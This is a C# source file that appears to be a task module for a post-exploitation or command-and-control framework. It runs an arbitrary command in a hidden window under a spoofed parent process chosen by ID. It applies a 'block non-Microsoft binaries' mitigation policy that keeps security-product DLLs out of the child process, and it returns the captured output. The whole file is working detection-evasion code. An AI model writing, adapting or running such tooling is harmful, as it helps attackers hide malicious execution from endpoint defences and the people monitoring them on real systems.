using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;
using Microsoft.Win32.SafeHandles;
using System.IO;


    public class Task
    {
        public static string Execute(string ProcID, string CommandToExecute)
        {
                    
            int newParentProcId = int.Parse(ProcID);
           
			string command = CommandToExecute;
         
            string result = UnmanagedExecute.CreateProcess(newParentProcId, command);
    
            return result;

        }
    }

    class UnmanagedExecute
    {
        [DllImport("kernel32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CreateProcess(
            string lpApplicationName, string lpCommandLine, ref SECURITY_ATTRIBUTES lpProcessAttributes,
            ref SECURITY_ATTRIBUTES lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags,
            IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFOEX lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(ProcessAccessFlags processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UpdateProcThreadAttribute(
            IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue,
            IntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool InitializeProcThreadAttributeList(
            IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref IntPtr lpSize);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool DeleteProcThreadAttributeList(IntPtr lpAttributeList);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool SetHandleInformation(IntPtr hObject, HANDLE_FLAGS dwMask,
           HANDLE_FLAGS dwFlags);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool PeekNamedPipe(IntPtr handle,
            IntPtr buffer, IntPtr nBufferSize, IntPtr bytesRead,
            ref uint bytesAvail, IntPtr BytesLeftThisMessage);

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool DuplicateHandle(IntPtr hSourceProcessHandle,
           IntPtr hSourceHandle, IntPtr hTargetProcessHandle, ref IntPtr lpTargetHandle,
           uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern int GetConsoleOutputCP();

        [DllImport("kernel32.dll")]
        static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe,
           ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

        public static string CreateProcess(int parentProcessId, string command)
        {
            // STARTUPINFOEX members
            const int PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;
            const int PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY = 0x00020007;

            // Block non-Microsoft signed DLL's
            const long PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON = 0x100000000000;

            // STARTUPINFO members (dwFlags and wShowWindow)
            const int STARTF_USESTDHANDLES = 0x00000100;
            const int STARTF_USESHOWWINDOW = 0x00000001;
            const short SW_HIDE = 0x0000;

            // dwCreationFlags
            const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
            const uint CREATE_NO_WINDOW = 0x08000000;

            // WaitForSingleObject INFINITE
            // const UInt32 INFINITE = 0xFFFFFFFF;
            var error = Marshal.GetLastWin32Error();

            // DuplicateHandle
            const uint DUPLICATE_CLOSE_SOURCE = 0x00000001;
            const uint DUPLICATE_SAME_ACCESS = 0x00000002;

            // https://msdn.microsoft.com/en-us/library/ms682499(VS.85).aspx
            // Handle stuff
            var saHandles = new SECURITY_ATTRIBUTES();
            saHandles.nLength = Marshal.SizeOf(saHandles);
            saHandles.bInheritHandle = true;
            saHandles.lpSecurityDescriptor = IntPtr.Zero;

            IntPtr hStdOutRead;
            IntPtr hStdOutWrite;
            // Duplicate handle created just in case
            IntPtr hDupStdOutWrite = IntPtr.Zero;

            // Create the pipe and make sure read is not inheritable
            CreatePipe(out hStdOutRead, out hStdOutWrite, ref saHandles, 0);
            SetHandleInformation(hStdOutRead, HANDLE_FLAGS.INHERIT, 0);

            var pInfo = new PROCESS_INFORMATION();
            var siEx = new STARTUPINFOEX();

            // Be sure to set the cb member of the STARTUPINFO structure to sizeof(STARTUPINFOEX).
            siEx.StartupInfo.cb = Marshal.SizeOf(siEx);
            IntPtr lpValueProc = IntPtr.Zero;
            IntPtr hSourceProcessHandle = IntPtr.Zero;

            // Values will be overwritten if parentProcessId > 0
            siEx.StartupInfo.hStdError = hStdOutWrite;
            siEx.StartupInfo.hStdOutput = hStdOutWrite;

            try
            {
                if (parentProcessId > 0)
                {
                    var lpSize = IntPtr.Zero;
                    var success = InitializeProcThreadAttributeList(IntPtr.Zero, 2, 0, ref lpSize);
                    if (success || lpSize == IntPtr.Zero)
                    {
                        return "false";
                    }

                    siEx.lpAttributeList = Marshal.AllocHGlobal(lpSize);
                    success = InitializeProcThreadAttributeList(siEx.lpAttributeList, 2, 0, ref lpSize);
                    if (!success)
                    {
                        return "false";
                    }
                    
                    IntPtr lpMitigationPolicy = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteInt64(lpMitigationPolicy, PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON);

                    // Add Microsoft-only DLL protection
                    success = UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY,
                        lpMitigationPolicy,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        Console.WriteLine("[!] Failed to set process mitigation policy");
                        return "false";
                    }

                    IntPtr parentHandle = OpenProcess(ProcessAccessFlags.CreateProcess | ProcessAccessFlags.DuplicateHandle, false, parentProcessId);
                    // This value should persist until the attribute list is destroyed using the DeleteProcThreadAttributeList function
                    lpValueProc = Marshal.AllocHGlobal(IntPtr.Size);
                    Marshal.WriteIntPtr(lpValueProc, parentHandle);

                    success = UpdateProcThreadAttribute(
                        siEx.lpAttributeList,
                        0,
                        (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                        lpValueProc,
                        (IntPtr)IntPtr.Size,
                        IntPtr.Zero,
                        IntPtr.Zero);
                    if (!success)
                    {
                        return "false";
                    }

                    IntPtr hCurrent = System.Diagnostics.Process.GetCurrentProcess().Handle;
                    IntPtr hNewParent = OpenProcess(ProcessAccessFlags.DuplicateHandle, true, parentProcessId);

                    success = DuplicateHandle(hCurrent, hStdOutWrite, hNewParent, ref hDupStdOutWrite, 0, true, DUPLICATE_CLOSE_SOURCE | DUPLICATE_SAME_ACCESS);
                    if (!success)
                    {
                        error = Marshal.GetLastWin32Error();
                        return "false";
                    }

                    error = Marshal.GetLastWin32Error();
                    siEx.StartupInfo.hStdError = hDupStdOutWrite;
                    siEx.StartupInfo.hStdOutput = hDupStdOutWrite;
                }
                
                siEx.StartupInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES;
                siEx.StartupInfo.wShowWindow = SW_HIDE;

                var ps = new SECURITY_ATTRIBUTES();
                var ts = new SECURITY_ATTRIBUTES();
                ps.nLength = Marshal.SizeOf(ps);
                ts.nLength = Marshal.SizeOf(ts);
                bool ret = CreateProcess(null, command, ref ps, ref ts, true, EXTENDED_STARTUPINFO_PRESENT | CREATE_NO_WINDOW, IntPtr.Zero, null, ref siEx, out pInfo);
                if(!ret)
                {
                    Console.WriteLine("[!] Proccess failed to execute!");
                    return "false";
                }
                SafeFileHandle safeHandle = new SafeFileHandle(hStdOutRead, false);
                var encoding = Encoding.GetEncoding(GetConsoleOutputCP());
                var reader = new StreamReader(new FileStream(safeHandle, FileAccess.Read, 4096, false), encoding, true);
                string result = "";
                bool exit = false;
                try
                {
                    do
                    {
                        if(WaitForSingleObject(pInfo.hProcess, 100) == 0)
                        {
                            exit = true;
                        }
                        
                        char[] buf = null;
                        int bytesRead;

                        uint bytesToRead = 0;

                        bool peekRet = PeekNamedPipe(hStdOutRead, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero, ref bytesToRead, IntPtr.Zero);

                        if (peekRet == true && bytesToRead == 0)
                        {
                            if (exit == true)
                            {
                                Console.WriteLine("Command executed.");
                                break;
                            }
                            else
                            {
                                continue;
                            }
                        }

                        if (bytesToRead > 4096)
                            bytesToRead = 4096;

                        buf = new char[bytesToRead];
                        bytesRead = reader.Read(buf, 0, buf.Length);
                        if (bytesRead > 0)
                        {
                            Console.WriteLine(String.Format("[+] {0} bytes read", bytesRead));
                            result += new string(buf);
                        }
                        
                    }while(true);
                    reader.Close();
                }
                finally
                {
                    if (!safeHandle.IsClosed)
                    {
                        safeHandle.Close();
                    }
                }

                if (hStdOutRead != IntPtr.Zero)
                {
                    CloseHandle(hStdOutRead);
                }
                Console.WriteLine(result);
                //return true;
              	return result;


            }
            finally
            {
                // Free the attribute list
                if (siEx.lpAttributeList != IntPtr.Zero)
                {
                    DeleteProcThreadAttributeList(siEx.lpAttributeList);
                    Marshal.FreeHGlobal(siEx.lpAttributeList);
                }
                Marshal.FreeHGlobal(lpValueProc);

                // Close process and thread handles
                if (pInfo.hProcess != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hProcess);
                }
                if (pInfo.hThread != IntPtr.Zero)
                {
                    CloseHandle(pInfo.hThread);
                }
            }
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFOEX
        {
            public STARTUPINFO StartupInfo;
            public IntPtr lpAttributeList;
        }

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct SECURITY_ATTRIBUTES
        {
            public int nLength;
            public IntPtr lpSecurityDescriptor;
            [MarshalAs(UnmanagedType.Bool)]
            public bool bInheritHandle;
        }

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        enum HANDLE_FLAGS : uint
        {
            None = 0,
            INHERIT = 1,
            PROTECT_FROM_CLOSE = 2
        }

        [Flags]
        public enum DuplicateOptions : uint
        {
            DUPLICATE_CLOSE_SOURCE = 0x00000001,
            DUPLICATE_SAME_ACCESS = 0x00000002
        }
    }
